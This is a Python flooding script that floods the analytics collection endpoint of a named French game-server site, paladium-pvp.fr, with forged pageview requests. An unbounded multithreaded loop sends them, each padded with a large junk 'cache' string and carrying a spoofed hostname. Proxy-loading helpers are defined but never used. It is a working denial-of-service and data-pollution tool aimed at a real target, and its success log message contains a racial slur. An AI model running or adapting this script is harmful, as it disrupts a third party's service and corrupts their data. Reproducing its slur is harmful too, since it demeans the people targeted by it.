import requests,random,os,sys
from threading import Thread,active_count

def proxies(ptype):
    match ptype:
        case "socks4":
            with open('./socks4_proxies.txt') as f:
                d = ''.join(random.choice(f.read().split('\n')))
                return {"http": f"socks4://{d}", "https": f"socks4://{d}"}
        case "http":
            with open('./http_proxies.txt') as f:
                e = ''.join(random.choice(f.read().split('\n')))
                return {"http": e, "https": e}
        case "socks5":
            with open('./socks5_proxies.txt') as f:
                d = ''.join(random.choice(f.read().split('\n')))
                return {"http": f"socks5://{d}", "https": f"socks5://{d}"}

def urlmarrant():
    with open('./urlmarrant.txt') as f:
        return ''.join(random.choice(f.read().split('\n')))

class console:
    def log(m):
        print(m)
        return True

payload = {
  "type": "pageview",
  "payload": {
    "website": "79b4d6c9-a3b8-4ebc-8c4d-c148d9f1e1dd",
    "hostname": urlmarrant(),
    "screen": "1x1",
    "language": "fr-FR",
    "cache": "╭◥█▓◥▚◥╯◤▄╭▟▟▓◤◤╭◥█▚◥▓◥▄╭◥╯◥◤▟▄▓▄╭▄◤╭▚▓▄▚▄▟▄▟▟▄██◥◥◤▄▚█╭▟▄▚▄▄▟▄▟▓◥╯█╭╭▟▄╯▓▚█▚▓◤▄◤▓▄◤╭▓▓▓◥╭█▟█╭╭▓╯╭◤▄◤▓╭╯◥╯█▟██▚╭╭◤▓▓╯▄██╭▚◥╯◥╯▟◤█◤▚╯▓▓▓▓╯╭▓█╭▚╯█▚╭◤▄▄▄▟▓█◤◥╭█◥▄╭╯╭◤╯◤╭╭◥▚╯◥▄▟◥█▟█◥▚▓╯█▓╯╯▟◥╭╭█╯╭▄▓▓◤◥▟╯◤▚█▄◤▄╭▓╯◥▟◤◥╭▚╭██▄█▟╭╭▚╯▚◤▟◥▟◤█▚▟█▄◤▓▄◤▓▄◥╯◤▓█◥◤▄◤▟╯◤╯▟█▄◤◥╯▓▟▄◥█▟█╯◤◥▄▄◤◤╯▟█▚▓◥█◤◥▟◥◥█▓◥▄▟▄╯╯╭▄█╭▚▄▚◥◤◥▚╯╭▟╭▄▄▟██◤▄▚█▟▄╭╭▄◤▓◥▚◤╯▄▟█◤╭▄██▚◥█▓◤▟█▓▄▓▟▄╯◥▓▄╭▟▚◥▓▟◥▚▄▓▄╭◥▓╯▚▓▟█╭▚▓▚▚▓╭╯╯▟╯◤◤◥▄╭◥▓╭▚█◥▓◤╯▓▟▟◥╭◤▚█▄█◥▄▄█╭◤◤▚◥▓▄▟█◤◥▄◥▟◥▟╭█▟╭▟╭◤╭█╯╭▚█◤▄▟▟╯▄▟◤◥◤▚◥▓╭▚◥╯╭█╯█▟▓▓◥◤▓◤╯▄▟█▟█▄▟▓◤▄╯▟╭█╯◤╭▓╭█▚▟◤▟▟◤▟███◥◥▟▚▚▄╭◥▓◤▄◤▓◥▚▟█╭█◤◥█▄◥▟▚▚▚◤▓▟╭▓╯▓▄▄◤▄█◤██╭╭█▓▚▓▓▟▚▚█╯█╯◤╭╯◤█▓◤▚▟█▓▚╭◥◥▚▟╭▓▄▟╭██◤╭▄╭▓█▓▄╯▚▓▟╭▟▚▟╯▓╭█◥▓▟▟▓▓▟◥◥▚▚▄█╯█▄◤▚▟██▄▚▄◥██╯◥◥▄▟▚█╯▟▚◤▚▟╭╭▓▟▄◥╭▟▄◤◤◥╯◥◥◥█╭▓▚▄╯▄◤▚◤█◥▚█╭▟╭◤╭◥▟▓▚█▟╭▄╯◤▄▟◤█▚▚▟▟◤◤▄◥▟▚╭╯╯█╯◤▓█▟▄▄╯◤◥▓█╯▚▟█▚◥▓◥██▚▟◤▚▓▄◤▄██╭╭▟▚▄◤◥▟◤◥╯╯╯▄██◤╯▟╭█╭╭◥╭╭◤╯▓◤▚▚▓╭▟◤▚▟◥╯╯▓▟◥◥▓▄▓█▄█▄▚▓▓▟╯▓╯█▄█◥╭▄╭▟◤◤◥╭█▚▚▄╭▓◤█▚▓███╭╯◥◤▚╭▚▚◥▟╯╯▟▟◤╭╯╯╭╭▄▓█▓▟▟▄▟╭◤◥█╯▟◤╯◤╯╯▄╯▟▚▄◥╭▓▟▄▓◥▄◤▚▄▓▚▚▟◤◥◤▚█▟╯◤█╯◤╭╯◤▓◥█◥▚▚╭▓╯╯╯▟╯╯▓█◤▓◥▟▓▟▚◤╭▄▚╭◤◤▄▟▚◥█▄╯╭▟╭╭█╭▓▓▚╭▓▚◤█▚█◥▓◥◥█╭╯◤╯╯╯╭▚◤▚▚█◤◥█▄▄▄◤▚▓▟╭╭◤◤◥◤▚╯█◥▓▄◤╯▚▓◤╭▚◥█╭▓╯◤▄▓╯╯◤▓◤╭╭▄◥◥▓█╭▄╯╯▄╭▄╯▚█╯◥▓█▚█╭▓◤╯█╯╭◥╯◤█▓▓◤╯▓██╭╯╯◤╭◥◥█▄◥▚◤╭█╭▄◤▚█▓╭◥╯▄◤▓▚▄▄◥▚◤╭╯▓╭▄◥◥╯╯◥▓╯▄▚█╭▄◥▟▚▟╯▄▚▟▓▟▟█◤██▄╯◤█╭◤╭◥▟▟▟╯█╭◥╯╭██╭╭╭██▓▚╯▄◤╭▄▓◤◤◥╭▟▄╯╯▟╯◥◤╭╯╯▄◥█▄◥▓▚◤╭╯▟▓▄▟▚▟▚╭◤╭▟╯█▓◥◤╯◤╯▚█▓╭▟╭◥╯▚╯▄╭█▄█◥▟██▚▓╭█▄◤◤◤◤▚╯▚◥◤▄◤╭◤▟█▄█◤╯◤◥╯▄▚╭╭▚◥█▄▄▚▓▚◤█◥▄▓▄▓▚◤▓◥╯╭▚▚╯█▚▚█╭◥╭▓◤▟◤▟◥◥▚◥▓◥◤◤╯╭╭◥▚▚◥╭▓╭╭▄▓▟╭╭◥▓╭◥█▓▚▟▓▄▚◥▚██▟◥◥▓◥█◥▓▄▓◥◥█▚▓█◥▟▟◤◥╭▄▚╯▄╭█▄◥◥█▟╭╭▟▚▚◥◤█▄▚▄▚▓◤▄▄▄▓▟▄▚▚▓╭╯╯◥▄██▟▟▄◤◤◥╯▓◥◤◤◤╯◤╭╭▟◤▄▓▟▟╭◤▓▚▚▟◥▟█╯◤█▟▓◤╯▟▄◥█◥▟╭◤▚▟▓╭▄▟█▓◥╭▄▓╭▓█╯█▟▓▚◥◤╭╯◥▚▚▓╯█▚▓█◥█▓◤◥█◤▓◥◥╭▚▟▚◤◥╯▟▚◥◥█◤╯▚╭╭▚█╯█▓╭▄╯▚╯▓▟▄◤▓▄◥╭▄◥◥▚╭◥█▟▄▟▟██▓▟▓▟╯▄▟██▓◥▚█╯▄◤█╭╯╯╭▓▚▓╯╯█◤◤╭╭▄▟▄▚▄◤▄▚◤▓▟▄╯█╭█╯◥╯▄╯╭╭▟█▄▄▚▄▓◥▟╭▄╭█▟█╭█◥╭◥╯◤╭▚╭▟╯◤╭◤▄╯▄◤╭▚▚◤◤╯▄█╭▄◥▄▟◥▟▓█╭╯╭█▄▄╭█▚▓╯╭▓╯▚╯◥◥█▓█▄◤╯╭╯◤╯◥▚▄╭◤█▓▟╯╭█◥█◤▓╯▄╯╯◥▚╯◤▓▓▄▚╭◥█╭█╯╭▄◤██▚╯╭▚╯▓▄◤╯▓▚█▚╭█▟▓◥╭▓╭▟╭█╭▄▓◤◤◤█◥◤▚▄╯╯◥██╯╭▄◤▄╭▚▓◤╯▚▟▟█▟▟▚◥◥▄▄╭╭▚█◥◤◤╯▟╯◤██▄▄╭▓▓╯◤◥◤▄╭╭◤▟▚◥◥▟◤◥╯▓◤╯▄▓◥█▚▄╭▚◥◥╭◥▓▟█▓▄▓█╯╯▄╭▚╯▓▄▚◤◥█◤╯▟◤╯╭◥╭▟╯▚█▚╯█▟◤◥▄█▄▓◥██▟▚▚╭▓▟◤▚◤█◥▟╭╯▄▟╯▓╯█▄▚▚╭▓▚▟▄◥╯█╯◥█▄╯▄◤▓◤▓◤▟▟╯▓◤╭▄◥▚▓◥◥◤█╭▄▚╯▚╯╯▟╭▟╭▟◥▚◥╭╯▟◥▚╭▓◥▟▓╯╯█▓▚╭╯◤▓█▟◤▄▚█▓▓▓▄╭◥◥╯▚▟█◤▚╯▓▚▓█▓╯█╯◤▚▓▟▚◥◥╯▟▚▚▟▟▚◥◥█◥╭▟◥╭╯██▚╯╯◤╭╯▓╯╯▄◤▟▚▚╭█◥╭◤▚╯◥▄▚╯▚◤╭█▄▄▄▓╭▚▓◤▄▟◥▚◥▓▟◤▟▚╯▚▚◤▚█▓█◥╯█╭◤╯▄╭╯▚╭▟▄█▄◤█◥▟◤▟▓▓▟▚▟▟▚▚█▟╯▟╭▚╯▚█◤▄▓▓◥▄◥▄╯╯◤▓▓▟▟◤▄▚◥◥◥▄▚▚█▟╯▟▓◥◤╯██▚▓█▚██╯█▓█◤▚█◤▓◥╭▚▟█╯◤▄▓▄╭▟◥╯█╯▓╯▄▚▓◤╭▄▓▓█▓◥◤▓╭╭╭▓╯█╯▄◥█╭▓◥╭█◤╭▄█▟╭◤▚█◤◤╭█◤◥▓╭▟█╭▓◤╭◤▚▚◤▄▚◥▚▄╭▟█▚▟╭▚╭╭◥╯◤╯╭╭╯▄╭╭▓▄╯▓▄▄▄◥╯▚◥╯╭╭▟╭╯▟▟◥▓◤▄╯▓╭█╯◥╯╭█▓▓▟▟╭▓◤╭◥▚▄▚▚◤▓◤█╯▚╭█◥▄▓▟◥◤█╭█╭▚╭╭◥█▚◥▄╯▄◥◤█▓██▄▄╭◤█▟▟╭◤╭╭◤◥▟◤◤▓▟▟◥╭▄▚▚◥◥▚╯◥▚▚╯╯█◤╭▚█◤╭◤╯▓█▟▄▚▓▄◤▄▟▚▚█▄╭▄◤╭╯▚▓▚██╯▚▄▓▟╭◤◤▄▚◤▟╯◥◤▓▓█▚▚▚◥◤╭◥▄◥◥█╭█╯▟▓◤▓▓╭▓◥◥▟◥◥▓▄█▓╭╯◤╭▄◤╯▄▚╯▓▟◤▓▓╭▓▚◥◥▓◥▓╯╭◥█▓▄◤◤╯◤██▓▟▚█◤╭◥▟▄█▟◤╯◤█╯▟◥╯█◤╭╭▚▚◥╯▄▚◥◥▟█╭◤▚█◥▄╯▓◤╯▄▚◤█▟▚▚▟█▚▚▟█▚◤╯╯█◥◤◤╭█▚╭▓▄╭▓▓▟◥╭▄▄╭◤▄◤▚▟╭█◥▚▄◤█╭╭▚◥◥▟█╭██╯▓◥◥▚╯▟▚◥◤▄▚█╭◤▄▓▄╯╭▚▓▓◥╯◤▓▟▓◤╯▚◤▄▓╯▓▓▓╭▓▓▚◤▟█▟◤▓▓▓◤▚▚◥▟▓◥▟╭▄▚▟◤▟╭▄◥◤◥▟▓╭◤▓╯▄█▄╭◥▟█▓▄█▓◤▟◥▟◥◥╭▓◤╯▄▄█╯▟▄◤▄█▟◤▄▓╯▚╭▚◤▚◤▓◥╯█▟◤◥◥╯▟╯▟▓◤▟█╭╯◥▓╭█▄◤▄╭╯▚◥▓◥▟▄◥▄╯█▄◤◥▓◥▄◥◥◥▓▓▟◤╯◥◤█▓◥▚╭◤█╭█◤◥▚█▟◥╯◤◤◥▓╯▄▟▄◤▓▄█▚╭╭◤╯╭╭╭▚◥▚╯◥╯▚▚◤▄╯▓█▄▓◥▓◤▚╭▄◥╯▄▄╭╯██▚◥▓▟╯▟▚◤◥▟◥█◤╭◤▟▚▚╭◥▚█▟█▚╯◤▓◥▓▄▟▄▓╯▚█▟▚▄◥▟▄◥▟▄█◥▓█▓╭▓▄◥◤╯╭▓▄▓◤▟▟█╭╭◥▚╯▟█▄▄╯▄▟▚▟◤╭╯◤◥▟╭◥◤█╭◤◤█▚╯◥██╭█◥▄╭▓▚╯▚╭╯◥╯╯▓◥▟╯╭▓█╭▓▟╯▓▟▚◤◥▟◤◤▓██▚▓╯▓◥█╯▚◥▟▚▓◥▄▄╯◤╭◤▟◥◤╯╭◥╯◥▚╭╭▟◤▄█╭◤█▟▄▓╭▟▟╯█╭█▟█▓▄╭╭╯◤╭◤◥◥◥◥▓▚▚▚╯▓▚╯▄╭▓█▚▓◥▟╭▓▄▚╯◤◥▓╯◤╭▚╭◤▓╯◤▓◥╭█╯█▟▟◤╭◥◤▚▟▚◥╭◤◤▄▚▟▄▓╯▄▄▓▟╯▚█▚◥▓▓▄╯◤▚▚╯╯▚▚▓▓╭▚◤╯█▓▄▓╭╯◥▓◤╯█◤▓▓▓▓╭╭▄▓▄▓▓▟▓▟◥╭█◤◥◥▚▄╭╭▓╭◥▄▟▟▟◤▄╭◤╭◤▓▚▟╯◤▟▓▓╭▚▟▚█▓╭◥◥◥╯╭█◥▓▓▄▓▄▓╭▄▚▄▄◤╭▓▄◥▚╯╯╯╯╯◥╭▚◤╭╭◥▄╭▄╭▄◥▓▚▄▟▚▚▟◥▄╯█▓◤▚▄◥╭▟╭╯▓▟█▄╯▄◥▚◥▄█╯▟▄╭▓▚█▄▓◥▓▚╯▓█▟◥▓◤◤█╯◥▟◤▚▓▚▓╭▟▟╭◥╭╯▚▟▄◤╯◥◤◤╯▚╭▟◤╯▄◤▟◤╭╯▄◥█◤▟▓╯▟▓▚█▓▓╯◥◤▟╯▄▓╭▄◥▓╯◥▄█╭▄▟█◥▚▓╯▚▟▚◤▓▟◤▟▓▚▓▓▟╭╯▓▚▄╭▓█▄◥◥▚▚█╭▟╭▟▄▚▓◤◤◤█▄╯▚▚▄▚█▓▟╭▚▟▟◥▄▟╯╯╯▚◥╯▟▓▓╯◥▚▄◤╭╭◤╯▚▟▚▟▚▓╯◥╭▚◥◤▟▓◤▚◥▄▚◥▟▄▓▟╯╯◥◤╯╯╯█╯▟█▚▚█▟◤╯◥╭▟╭▚◥◥◤╭█╯▚█╯▚╯◥█▄╯▚▟╭▄▄◤▚▟▚▓╯█╭▓▟▓╭◥◥▓◥◤◥▟◥▓◤╯▚◥█╭╭▓╯╯◤╯◤▚██",
    "url": "/",
    "referrer": "https://paladium-pvp.fr/"
  }
}
def spam():
    payloadsize = sys.getsizeof(payload["payload"]["cache"]) / 1024
    try:
        r = requests.post("https://unami.paladium-pvp.fr/api/collect", data=payload)
        match r.status_code:
            case 200:
                try:
                    console.log(f"[+] nigga packet sent (200) | {payloadsize}MB")
                except Exception as e:
                    ekscept = 0
                    while ekscept == 0:
                        try:
                            console.log("an error occurred")
                        except Exception as e:
                            console.log("an error occurred while trying to print the error")
            case 500:
                print("[-] Internal Server Error 500")
                print(r.text)
            case _:
                print(r.status_code)
                print(r.text)
    except Exception:
        pass

os.system('clear')
#spam()
threads = int(input("Thread amount\n"))
for _ in iter(int, 1):
	while True:
		if (active_count() <= threads):
			Thread(target=(spam)).start()
			break